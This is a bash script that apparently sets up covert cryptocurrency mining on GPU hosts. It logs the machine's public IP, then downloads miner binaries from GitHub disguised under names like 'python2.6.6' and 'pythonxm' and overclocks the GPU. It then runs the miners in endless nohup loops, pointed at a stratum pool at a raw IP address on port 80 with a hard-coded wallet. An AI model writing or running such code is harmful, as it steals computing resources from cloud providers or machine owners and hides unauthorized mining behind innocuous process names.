#!bin/bash -xe 

## getting IP info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl ipinfo.io

echo '#######################################################'
echo '##################### Test N 40 ########################'
echo '#######################################################'

rm -rf python2.6.6
rm -rf pythonoc
wget -q https://github.com/one10001/10001code/releases/download/2.6.6/python2.6.6 2> lol.out
chmod +x python2.6.6
cp python2.6.6 pythonoc

#### Clean logs
echo > cuout
echo > ocout
echo > ocoutdef
echo > cuoutdef
echo > oout
echo > results.txt 

########## XMR
rm -rf pythonxm
rm -rf config3.json
rm -rf x.out

# Prepare
wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
chmod +x pythonxm
wget -q https://github.com/one10001/10001code/raw/main/config3.json
sed -i "s+ip0001+$IPNAME+g" config3.json



if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
then
    while true
    do 
        date 
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U 2>> cuoutdef 1>> cuoutdef &
        nohup ./pythonxm -c config3.json 2>> cuoutdef 1>> cuoutdef &
        tail -f cuoutdef
   done

elif [ $(nvidia-smi | grep T4 |wc -l) == 1 ]
then
    echo '................... PARAM T4 ...................................'
    nvidia-smi -pm ENABLED -i 0
    nvidia-smi -ac 5001,1590
    while true
    do
        date
        nohup ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.OC_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout & # --cl-global-work 16384     --cl-local-work 256 2>> oout 1>> oout &
        nohup ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.CU_$IPNAME@116.203.10.54:80 2>> oout 1>> oout & #  --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout 
    done
else
    while true
    do
        date
        nohup ./pythonoc  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 128 2>> oout 1>> oout &
        #./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80   --cuda-parallel-hash 4  --cuda-block-size 256   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 16384 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout 
    done
fi
